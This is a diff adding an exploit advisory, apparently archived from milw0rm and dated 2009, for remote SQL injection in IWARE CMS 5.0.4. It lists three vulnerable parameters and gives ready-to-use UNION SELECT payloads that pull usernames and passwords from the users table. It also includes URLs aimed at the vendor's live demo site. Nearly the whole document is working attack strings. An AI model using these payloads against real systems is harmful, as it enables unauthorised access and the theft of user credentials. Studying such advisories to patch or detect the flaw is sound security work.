@@ -1,0 +1,56 @@
+###################################################################
+CMS IWARE 5.0.4 REMOTE SQL-injection vulnerability 
+###################################################################
+
+
+###################################################
+#[~] Author        :  boom3rang 
+#[~] Greetz        :  H!tm@N, KHG, chs, redc00de
+#[~] Vulnerability :  Remote SQL-injection
+#[~] Google Dork   :  N/W
+--------------------------------------------------   
+#[!] Product Site  :  www.iwarecms.nl
+#[!] Download CMS  :  http://www.iwarecms.nl/download.php?f=IWARE_5.0.4.zip
+#[!] Version       :  5.0.4
+###################################################
+
+[+] Remote SQL injection 
+
+
+Example:
+http://localhost/path/index.php?D=[SQL injection]
+
+SQL:
+'/**/and/**/1=2/**/UNION/**/SELECT/**/concat(username,char(58),password)+from+iware_users/*
+
+Demo:
+http://www.iwarecms.nl/demo/index.php?D=63'/**/and/**/1=2/**/UNION/**/SELECT/**/concat(username,char(58),password)+from+demo_users/*
+
+-----------------
+Example 2:
+http://localhost/path/index.php?D=52&cmd=33&file=NewsArticles_1.0.0&view=1&category=&id=[SQL injection]
+
+SQL:
+'/**/and/**/1=2/**/UNION/**/SELECT/**/0,1,2,concat(username,char(58),password),4,null+from+iware_users/*
+
+Demo 2:
+http://www.iwarecms.nl/demo/index.php?D=52&cmd=33&file=NewsArticles_1.0.0&view=1&category=&id=3'/**/and/**/1=2/**/UNION/**/SELECT/**/0,1,2,concat(username,char(58),password),4,null+from+demo_users/*
+
+-----------------
+Example 3:
+http://localhost/path/index.php?D=54&cmd=33&file=ImageGallery_1.0.0&category=[SQL injection]
+
+SQL:
+'/**/and/**/1=2/**/UNION/**/SELECT/**/0,1,null,concat(username,char(58),password)+from+iware_users/*
+
+http://www.iwarecms.nl/demo/index.php?D=54&cmd=33&file=ImageGallery_1.0.0&category=2'/**/and/**/1=2/**/UNION/**/SELECT/**/0,1,null,concat(username,char(58),password)+from+demo_users/*
+
+
+
+##############################
+#[!] Proud 2 be Albanian
+#[!] Proud 2 be Muslim
+#[!] R.I.P redc00de
+##############################
+
+# milw0rm.com [2009-03-29]
